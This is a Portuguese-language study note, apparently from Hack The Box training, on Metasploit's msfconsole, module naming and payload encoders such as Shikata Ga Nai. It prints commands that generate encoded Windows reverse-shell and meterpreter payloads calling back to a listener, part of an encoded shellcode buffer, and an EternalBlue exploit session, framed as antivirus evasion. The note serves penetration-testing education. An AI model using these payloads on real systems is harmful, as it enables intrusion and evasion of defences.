### O que é ?

O Metasploit Project é uma plataforma de teste de penetração modular baseada em Ruby que permite escrever, testar e executar o código de exploração. Este código de exploração pode ser feito sob medida pelo usuário ou retirado de um banco de dados contendo as mais recentes explorações já descobertas e modularizadas. O Metasploit Frameworkinclui um conjunto de ferramentas que você pode usar para testar vulnerabilidades de segurança, enumerar redes, executar ataques e evitar a detecção. Em seu núcleo, o Metasploit Projecté uma coleção de ferramentas comumente usadas que fornecem um ambiente completo para testes de penetração e desenvolvimento de exploits.O msfconsoleé provavelmente a interface mais popular para o Metasploit Framework(MSF).

- msfconsole -q (não exibe o banner.)
- search name
- show targets
- options
- use
- info
- setg
- run
- sessions
- sessions -i 1
- jobs

### Sintaxe dos modulos

```
 <No.> <type>/<os>/<service>/<name>

Exemplo: 794 exploit/windows/ftp/scriptftp_list
```

### Types

<img width="966" height="621" alt="image" src="https://github.com/user-attachments/assets/24fe1415-fa69-44f5-b309-c036c60ecd4f" />


### Encoders

Ao longo dos 15 anos de existência do Metasploit Framework, Encoders ajudaram a tornar os payloads compatíveis com diferentes arquiteturas de processador e, ao mesmo tempo, ajudaram na evasão de antivírus. Encoders entram em jogo com o papel de alterar a carga útil para rodar em diferentes sistemas operacionais e arquiteturas. Essas arquiteturas incluem: x64, x86,	sparc,	ppc,	mips.

- Um dos Encoders mais famosos do msf está o O Shikata Ga Nai (SGN). É um encoder polimórfico muito usado no Metasploit Framework para ofuscar payloads. O objetivo dele é evitar detecção por antivírus, IDS/IPS e filtros de assinatura. O nome “Shikata Ga Nai” vem do japonês e significa “não pode ser evitado” ou “não há o que fazer”.

- O SGN usa uma técnica chamada: Polymorphic XOR Additive Feedback. Isso significa:
```
1️⃣ O payload é codificado usando XOR
2️⃣ A chave muda dinamicamente (Additive Feedback)
3️⃣ O decoder muda a cada geração (Polymorphic)
```

- Se quiséssemos criar nossa carga útil personalizada, poderíamos fazê-lo através de msfpayload, mas teríamos que codificá-lo de acordo com a arquitetura do sistema operacional de destino usando msfencode depois.

```
Gust4vo@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)

my $buf = 
"\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9" .
"\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2" .
"\x8e\xc9\xe7\x76\x50\x3c\xd8\xf1\xf9\x2e\x7c\x91\x8e\xdd" .
"\x53\x1e\x18\x47\xc0\x8c\x87\xf5\x7d\x3b\x52\x88\x0e\xa6" .
"\xc3\x18\x92\x58\xdb\xcd\x74\xaa\x2a\x3a\x55\xae\x35\x36" .
"\xf0\x5d\xcf\x96\xd0\x81\xa7\xa2\x50\xb2\x0d\x64\xb6\x45" .
"\x06\x0d\xe6\xc4\x8d\x85\x97\x65\x3d\x0a\x37\xe3\xc9\xfc" .
"\xa4\x9c\x5c\x0b\x0b\x49\xbe\x5d\x0e\xdf\xfc\x2e\xc3\x9a" .
"\x3d\xd7\x82\x48\x4e\x72\x69\xb1\xfc\x34\x3e\xe2\xa8\xf9" .
"\xf1\x36\x67\x2c\xc2\x18\xb7\x1e\x13\x49\x97\x12\x03\xde" .
"\x85\xfe\x9e\xd4\x1d\xcb\xd4\x38\x7d\x39\x35\x6b\x5d\x6f" .
"\x50\x1d\xf8\xfd\xe9\x84\x41\x6d\x60\x29\x20\x12\x08\xe7" .
"\xcf\xa0\x82\x6e\x6a\x3a\x5e\x44\x58\x9c\xf2\xc3\xd6\xb9" .

<SNIP>

```

- Exemplo com o msfvenom:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -f exe > shell.exe
```

- Vizualizar Encoders compativeis com seu payload:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```

- Vale ressaltar que muitos desses codificadores padrões (como por exemplo a SGN) seriam detectados por AVs atualmente, mesmo com multiplas interações do mesmo enconde (opção -i).
